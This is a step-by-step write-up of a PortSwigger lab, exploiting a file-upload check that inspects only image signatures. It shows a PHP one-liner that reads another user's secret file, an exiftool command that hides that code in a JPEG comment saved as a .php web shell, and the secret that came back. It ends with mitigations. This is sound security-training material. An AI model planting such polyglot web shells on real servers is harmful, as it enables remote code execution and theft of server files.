# Remote Code Execution via Polyglot Web Shell Upload

## 📌 Lab Overview

This lab demonstrates how an application can be bypassed when it validates uploaded files based on their **file signature (magic bytes)** rather than their actual contents.

The goal was to upload a file that:

- looks like a valid JPEG image
- passes the application's image validation checks
- still contains executable PHP code
- executes when accessed through the web server

This type of file is known as a **Polyglot File**.

---

# 🔍 What is a Polyglot File?

A **polyglot file** is a file that is valid in more than one format at the same time.

For example:

```text
Valid JPEG Image
+
Valid PHP Script
=
Polyglot File
```

The application checks:

```text
"Is this a JPEG?"
```

The web server later checks:

```text
"Does this file contain PHP code?"
```

Since the file satisfies both conditions, it can bypass upload validation and still execute as PHP.

---

# 🎯 Objective

The objective of this lab was to:

- bypass image validation
- upload a PHP web shell
- retrieve Carlos's secret
- solve the lab

---

# 🖼 Step-by-Step Walkthrough

## Screenshot 1 — Normal Webpage

The application initially displayed a normal webpage containing a:

```text
My Account
```

button.

---

## Screenshot 2 — Login

After clicking **My Account**, I landed on the login page.

The lab provided credentials:

```text
Username: wiener
Password: peter
```

I entered them and logged in successfully.

---

## Screenshot 3 — Avatar Upload Functionality

After logging in as:

```text
wiener
```

I could see:

- Update Email functionality
- Avatar Upload functionality

To understand how uploads worked, I selected:

```text
luffy.jpg
```

and uploaded it.

---

## Screenshot 4 — Successful Image Upload

The application responded:

```text
The file avatars/luffy.jpg has been uploaded.
```

This confirmed that image uploads were functioning correctly.

---

## Screenshot 5 — Attempting a PHP Upload

After returning to **My Account**, I confirmed the image was displayed correctly.

I then selected:

```php
virus.php
```

containing:

```php
<?php echo file_get_contents('/home/carlos/secret') ?>
```

and attempted to upload it.

---

## Screenshot 6 — Upload Rejected

The application responded:

```text
Error.
File is not a valid image.

Sorry, there was an error uploading your file.
```

### What Happened?

Unlike previous labs, the application was not only checking:

```text
File Extension
```

It was also validating the file's actual image structure.

Many applications verify:

```text
JPEG Signature
PNG Signature
GIF Signature
```

before accepting uploads.

This is commonly called:

```text
File Signature Validation
```

or

```text
Magic Byte Validation
```

Since:

```text
virus.php
```

was purely a PHP file and did not contain a valid JPEG header, the upload was rejected.

The application essentially performed:

```text
Does file end with .jpg?
      +
Does file actually look like a JPEG?
```

The second check failed.

---

## Screenshot 7 — Inspecting a Legitimate JPEG

I moved to the terminal and inspected the original image:

```bash
exiftool luffy.jpg
```

The output displayed JPEG metadata and confirmed:

```text
File Type : JPEG
```

This showed that the file contained valid image metadata.

---

## Screenshot 8 — Inspecting the PHP File

Next, I inspected:

```bash
exiftool virus.php
```

The output confirmed:

```text
File Type : PHP
```

This explained why the upload was being blocked.

The application expected:

```text
JPEG
```

but received:

```text
PHP
```

---

## Screenshot 9 — Creating a Polyglot File

To bypass the validation, I decided to hide PHP code inside a legitimate JPEG image.

I used:

```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" luffy.jpg -o qwert.php
```

### Command Breakdown

#### exiftool

```bash
exiftool
```

A tool used to read and modify metadata inside files.

---

#### -Comment="..."

```bash
-Comment="..."
```

Adds a custom comment into the image metadata.

The comment I inserted was:

```php
<?php echo 'START ' .
file_get_contents('/home/carlos/secret')
. ' END'; ?>
```

---

#### START and END

```php
START
```

and

```php
END
```

were added as markers.

This makes it easier to locate the secret when the file executes.

Example output:

```text
START secret_value END
```

---

#### file_get_contents()

```php
file_get_contents('/home/carlos/secret')
```

Reads Carlos's secret file from the server.

---

#### luffy.jpg

```bash
luffy.jpg
```

The legitimate JPEG image that already contains valid image headers and metadata.

---

#### -o qwert.php

```bash
-o qwert.php
```

Creates a new output file named:

```text
qwert.php
```

The resulting file:

```text
Looks like JPEG
+
Contains PHP code
=
Polyglot File
```

---

## Screenshot 10 — Verifying the Polyglot File

I inspected the newly created file:

```bash
exiftool qwert.php
```

The output showed:

- JPEG metadata
- Image information
- My injected comment

This confirmed the file was still a valid image while also containing PHP code.

---

## Screenshot 11 — Uploading the Polyglot File

I returned to the application and uploaded:

```text
qwert.php
```

through the avatar upload functionality.

---

## Screenshot 12 — Upload Successful

The application responded:

```text
The file avatars/qwert.php has been uploaded.
```

This confirmed that the image validation had been bypassed successfully.

Why?

Because the application saw:

```text
Valid JPEG Metadata
```

and accepted the upload.

---

## Screenshot 13 — Executing the Web Shell

After returning to **My Account**, the avatar appeared as a broken image.

I right-clicked the image and selected:

```text
Open Image in New Tab
```

The page displayed a large amount of image data, but hidden inside it was:

```text
START xiHVfKOVRux80u2912KPhHLzjhTp5Xu0 END
```

as shown in the uploaded screenshot.

### What Happened?

When the file was requested:

```text
qwert.php
```

Apache treated it as:

```text
PHP
```

because of its extension.

The server executed the PHP code embedded in the image comment.

That PHP code executed:

```php
file_get_contents('/home/carlos/secret')
```

and printed:

```text
START <secret> END
```

inside the image output.

The markers helped identify the secret among the image's binary data.

The secret was:

```text
xiHVfKOVRux80u2912KPhHLzjhTp5Xu0
```

I copied it and submitted it through the lab banner.

The lab was successfully solved.

---

# 💡 Why This Attack Worked

The application validated:

```text
File Signature
```

but trusted:

```text
File Extension
```

for execution.

Validation Logic:

```text
Is it a valid image?
✓ Yes
```

Execution Logic:

```text
Does it end with .php?
✓ Yes
```

Result:

```text
Upload Allowed
+
PHP Executed
=
Remote Code Execution
```

---

# 💥 Impact

An attacker could potentially:

- upload web shells
- execute arbitrary PHP code
- read sensitive files
- steal credentials
- gain full server compromise

---

# 🛡 Mitigation

To prevent this issue:

- validate both file signatures and extensions
- store uploads outside the web root
- disable script execution in upload directories
- rename uploaded files using server-generated names
- strip metadata from uploaded images
- use image re-encoding before storage

Example:

```text
Upload
↓
Validate Signature
↓
Re-encode Image
↓
Generate Random Filename
↓
Store Outside Web Root
```

---

# 🧠 Skills Learned

- File Upload Vulnerabilities
- Polyglot Files
- JPEG Metadata Manipulation
- EXIF Data Abuse
- Web Shell Upload Techniques
- Remote Code Execution
- File Signature Validation Bypass

---

# 🧰 Tools Used

- Burp Suite
- ExifTool
- Firefox
- PortSwigger Web Security Academy

---

# ✅ Conclusion

This lab demonstrated how relying solely on image validation is insufficient when handling file uploads.

By embedding PHP code inside JPEG metadata, I created a **polyglot file** that was simultaneously a valid image and a valid PHP script.

The application accepted the file because it passed image validation, while Apache later executed the embedded PHP code because of the `.php` extension.

This resulted in successful Remote Code Execution and allowed retrieval of Carlos's secret, ultimately solving the lab.
